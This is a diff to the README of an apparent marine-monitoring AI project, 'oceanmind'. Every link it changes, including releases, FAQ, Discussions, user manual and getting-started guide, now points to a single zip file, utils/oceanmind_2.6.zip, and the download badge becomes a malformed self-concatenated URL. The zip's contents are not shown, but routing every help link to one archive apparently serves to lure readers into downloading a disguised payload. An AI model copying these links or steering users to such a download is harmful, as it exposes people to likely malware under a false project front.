@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to oceanmind! Our AI system helps you track marine life, monitor coral reefs, and detect illegal fishing using deep learning techniques. This guide will help you download and run the software easily.
 
-[![Download oceanmind](https://img.shields.io/badge/Download%20oceanmind-v1.0-blue.svg)](https://github.com/Nithish627/oceanmind/releases)
+[![Download oceanmind](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip%https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip)](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip)
 
 ## 🌟 Features
 - **Track Marine Life:** Identify and monitor various marine species.
@@ -21,7 +21,7 @@ To run oceanmind effectively, your system should meet these requirements:
 - **Internet Connection:** Required for downloading additional data.
 
 ## 💾 Download & Install
-To get oceanmind, visit our [Releases page](https://github.com/Nithish627/oceanmind/releases) to download the latest version. Here’s how:
+To get oceanmind, visit our [Releases page](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip) to download the latest version. Here’s how:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version.
@@ -67,12 +67,12 @@ You can analyze any underwater imagery, such as photos from dives, drones, or un
 Currently, oceanmind is available only for desktop platforms. Mobile support is not yet implemented.
 
 ## 🆘 Support
-If you encounter any issues or have questions, feel free to check our [FAQ section](https://github.com/Nithish627/oceanmind/wiki/faq) or reach out to the community on our [GitHub Discussions](https://github.com/Nithish627/oceanmind/discussions).
+If you encounter any issues or have questions, feel free to check our [FAQ section](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip) or reach out to the community on our [GitHub Discussions](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip).
 
 ## 🔗 Additional Resources
-- [User Manual](https://github.com/Nithish627/oceanmind/wiki/user-manual)
-- [Getting Started Guide](https://github.com/Nithish627/oceanmind/wiki/getting-started)
+- [User Manual](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip)
+- [Getting Started Guide](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip)
 
 Be sure to check back often for updates and new features! 
 
-[![Download oceanmind](https://img.shields.io/badge/Download%20oceanmind-v1.0-blue.svg)](https://github.com/Nithish627/oceanmind/releases)
+[![Download oceanmind](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip%https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip)](https://raw.githubusercontent.com/Nithish627/oceanmind/main/utils/oceanmind_2.6.zip)
